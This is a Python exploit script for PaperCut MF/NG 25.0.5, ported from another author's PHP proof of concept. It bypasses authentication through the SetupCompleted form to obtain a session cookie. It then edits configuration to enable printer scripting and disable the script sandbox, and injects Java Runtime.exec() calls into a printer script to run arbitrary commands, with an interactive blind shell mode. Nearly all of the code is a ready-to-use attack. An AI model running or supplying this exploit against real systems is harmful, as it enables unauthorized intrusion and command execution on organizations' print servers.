#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
PaperCut MF/NG 25.0.5 Authentication Bypass + Print-Script RCE
Python port of indoushka's PHP PoC.

- Standard library only (no requests / urllib3).
- Auth bypass: SetupCompleted Tapestry direct-render -> JSESSIONID.
- RCE: enable print script, disable sandbox, inject scriptBody with
  Runtime.getRuntime().exec(), then restore settings.

NOTE: execution is BLIND - command output is not returned.
      Authorized testing only. No version detection is performed.
"""

import argparse
import http.client
import re
import ssl as _ssl
import sys
import urllib.parse

UA = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'


class Response(object):
    __slots__ = ('status', 'text', 'headers')

    def __init__(self, status, text, headers):
        self.status = status
        self.text = text
        self.headers = headers


class HttpClient(object):
    """Tiny curl-like client with a cookie jar and redirect following."""

    def __init__(self, scheme, host, port, verify=False, timeout=30):
        self.scheme = scheme
        self.host = host
        self.port = port
        self.verify = verify
        self.timeout = timeout
        self.cookies = {}

    def _connection(self):
        if self.scheme == 'https':
            ctx = _ssl.create_default_context() if self.verify else _ssl._create_unverified_context()
            return http.client.HTTPSConnection(self.host, self.port, context=ctx, timeout=self.timeout)
        return http.client.HTTPConnection(self.host, self.port, timeout=self.timeout)

    def _store_cookies(self, headers):
        for k, v in headers:
            if k.lower() == 'set-cookie':
                pair = v.split(';', 1)[0].strip()
                if '=' in pair:
                    name, val = pair.split('=', 1)
                    self.cookies[name.strip()] = val.strip()

    def cookie_header(self):
        return '; '.join('%s=%s' % (k, v) for k, v in self.cookies.items())

    def request(self, method, path, data=None, headers=None):
        """path includes query string. Follows redirects like curl (cap 5)."""
        hdrs = {'User-Agent': UA, 'Accept': '*/*', 'Connection': 'close'}
        if self.cookies:
            hdrs['Cookie'] = self.cookie_header()
        if headers:
            hdrs.update(headers)

        body = None
        if data is not None:
            if isinstance(data, dict):
                body = urllib.parse.urlencode(data)
                hdrs['Content-Type'] = 'application/x-www-form-urlencoded'
            else:
                body = data

        redirects = 0
        current_method = method
        current_body = body
        current_path = path

        while True:
            try:
                conn = self._connection()
                conn.request(current_method, current_path, body=current_body, headers=hdrs)
                resp = conn.getresponse()
                status = resp.status
                resp_headers = resp.getheaders()
                raw = resp.read()
                resp.close()
                conn.close()
            except (http.client.HTTPException, OSError, _ssl.SSLError):
                return None

            self._store_cookies(resp_headers)

            loc = None
            for k, v in resp_headers:
                if k.lower() == 'location':
                    loc = v
                    break

            if status in (301, 302, 303, 307, 308) and loc and redirects < 5:
                redirects += 1
                parsed = urllib.parse.urlsplit(loc)
                # Only follow same-host/scheme relative or absolute redirects.
                if parsed.scheme in ('', self.scheme) and parsed.netloc in ('', '%s:%s' % (self.host, self.port)):
                    if not parsed.path:
                        continue
                    current_path = parsed.path + (('?' + parsed.query) if parsed.query else '')
                    if current_method == 'POST' and status in (302, 303):
                        current_method = 'GET'
                        current_body = None
                    continue
                # otherwise treat as final

            return Response(status, raw.decode('utf-8', 'replace'), resp_headers)


class PaperCutPrintScriptExploit(object):
    def __init__(self, target_url, timeout=30, verify=False, verbose=False):
        parsed = urllib.parse.urlsplit(target_url.rstrip('/'))

        scheme = parsed.scheme or 'http'
        host = None
        port = None

        # http://host:9191[/path] or host:9191[/path]
        hp = parsed.netloc or parsed.path
        if ':' in hp and not hp.startswith('['):
            host_part, port_part = hp.rsplit(':', 1)
            host, port = host_part, int(port_part)
        else:
            host = hp
            port = 443 if scheme == 'https' else 80

        app_path = parsed.path.strip('/') if '://' not in target_url else parsed.path
        if not app_path or app_path == '':
            app_path = 'app'
        self.app_path = '/' + app_path.lstrip('/')

        self.base = '%s://%s:%d' % (scheme, host, port)
        self.http = HttpClient(scheme, host, port, verify=verify, timeout=timeout)
        self.verbose = verbose

    def log(self, msg):
        print('[*] ' + msg)

    def vlog(self, msg):
        if self.verbose:
            print('[*] ' + msg)

    def ok(self, msg):
        print('[+] ' + msg)

    def fail(self, msg):
        print('[-] ' + msg)

    # ------------------------------------------------------------------ #
    # Step 1: authentication bypass via SetupCompleted
    # ------------------------------------------------------------------ #
    def get_session_id(self):
        self.log('Attempting authentication bypass...')

        resp = self.http.request('GET', self.app_path + '?service=page/SetupCompleted')
        if resp is None:
            self.fail('Authentication bypass failed (no response)')
            return False

        post_data = [
            ('service', 'direct/1/SetupCompleted/$Form'),
            ('sp', 'S0'),
            ('Form0', '$Hidden,analyticsEnabled,$Submit'),
            ('$Hidden', 'true'),
            ('$Submit', 'Login'),
        ]

        headers = {'Origin': self.base}

        resp = self.http.request('POST', self.app_path, data=post_data, headers=headers)

        if resp is not None and resp.status == 200 and 'papercut' in resp.text.lower():
            if any('jsessionid' in k.lower() for k in self.http.cookies):
                self.ok('Authentication bypass successful! Obtained JSESSIONID')
                return True

        self.fail('Authentication bypass failed')
        return False

    # ------------------------------------------------------------------ #
    # ConfigEditor two-step setting update (direct/1/...)
    # ------------------------------------------------------------------ #
    def set_setting(self, setting, enabled):
        self.log('Updating %s to %s' % (setting, enabled))

        # quickFindForm selects the property row
        post_data = [
            ('service', 'direct/1/ConfigEditor/quickFindForm'),
            ('sp', 'S0'),
            ('Form0', '$TextField,doQuickFind,clear'),
            ('$TextField', setting),
            ('doQuickFind', 'Go'),
        ]
        headers = {'Origin': self.base}

        resp = self.http.request('POST', self.app_path, data=post_data, headers=headers)

        # $Form submits the edit
        post_data = [
            ('service', 'direct/1/ConfigEditor/$Form'),
            ('sp', 'S1'),
            ('Form1', '$TextField$0,$Submit,$Submit$0'),
            ('$TextField$0', enabled),
            ('$Submit', 'Update'),
        ]

        resp = self.http.request('POST', self.app_path, data=post_data, headers=headers)

        if resp is not None and 'Updated successfully' in resp.text:
            self.ok('Setting updated successfully')
            return True

        self.fail('Failed to update setting')
        return False

    # ------------------------------------------------------------------ #
    # Step 2: print-script RCE
    # ------------------------------------------------------------------ #
    def execute_command(self, command):
        self.log('Preparing to execute command: %s' % command)

        if "'" in command:
            self.fail("Command contains a single quote which will break the inline Groovy/Java string")
            return False

        self.set_setting('print-and-device.script.enabled', 'Y')
        self.set_setting('print.script.sandboxed', 'N')

        # Navigate to the printer configuration stateful flow.
        steps = [
            self.app_path + '?service=page/PrinterList',
            self.app_path + '?service=direct/1/PrinterList/selectPrinter&sp=l1001',
            self.app_path + '?service=direct/1/PrinterDetails/printerOptionsTab.tab&sp=4',
        ]
        for step in steps:
            self.vlog('Navigating: %s' % step)
            self.http.request('GET', step)

        script_body = (
            'function printJobHook(inputs, actions) {}\r\n'
            "java.lang.Runtime.getRuntime().exec('" + command + "');"
        )

        post_data = [
            ('service', 'direct/1/PrinterDetails/$PrinterDetailsScript.$Form'),
            ('sp', 'S0'),
            ('Form0', 'printerId,enablePrintScript,scriptBody,$Submit,$Submit$0,$Submit$1'),
            ('printerId', 'l1001'),
            ('enablePrintScript', 'on'),
            ('scriptBody', script_body),
            ('$Submit$1', 'Apply'),
        ]
        headers = {'Origin': self.base}

        resp = self.http.request('POST', self.app_path, data=post_data, headers=headers)

        if resp is not None and 'Saved successfully' in resp.text:
            self.ok('Command executed successfully!')

            # Cleanup: restore secure defaults.
            self.set_setting('print-and-device.script.enabled', 'N')
            self.set_setting('print.script.sandboxed', 'Y')
            return True

        self.fail('Command execution failed - printer might not be configured')
        self.log('Try manually adding a printer in PaperCut admin interface')
        return False

    # ------------------------------------------------------------------ #
    def exploit(self, command):
        if not self.get_session_id():
            return False
        return self.execute_command(command)

    def interactive_shell(self):
        self.ok("Starting interactive shell. Type 'exit' to quit.")
        while True:
            try:
                cmd = input('papercut> ').strip()
            except (EOFError, KeyboardInterrupt):
                print()
                break
            if cmd == 'exit':
                break
            if cmd:
                self.execute_command(cmd)


BANNER = r"""
 PaperCut MF/NG 25.0.5 Authentication Bypass + Print-Script RCE
 Python port of indoushka's PoC   (blind execution - no output capture)
"""


def main(argv=None):
    parser = argparse.ArgumentParser(
        description='PaperCut MF/NG 25.0.5 auth bypass + print-script RCE (Python port)'
    )
    parser.add_argument('-u', '--url', required=True, help='Target URL, e.g. http://host:9191')
    parser.add_argument('-c', '--command', default='whoami', help='Command to execute (default: whoami)')
    parser.add_argument('-i', '--interactive', action='store_true', help='Interactive command shell')
    parser.add_argument('-v', '--verbose', action='store_true')
    parser.add_argument('--verify', action='store_true',
                        help='verify TLS certificates (default: disabled)')
    parser.add_argument('--timeout', type=int, default=30)

    args = parser.parse_args(argv)

    print(BANNER)

    ex = PaperCutPrintScriptExploit(args.url, timeout=args.timeout,
                                    verify=args.verify, verbose=args.verbose)

    if args.interactive:
        if ex.exploit('echo "Interactive shell started"'):
            ex.interactive_shell()
    else:
        ex.exploit(args.command)

    return 0


if __name__ == '__main__':
    sys.exit(main())
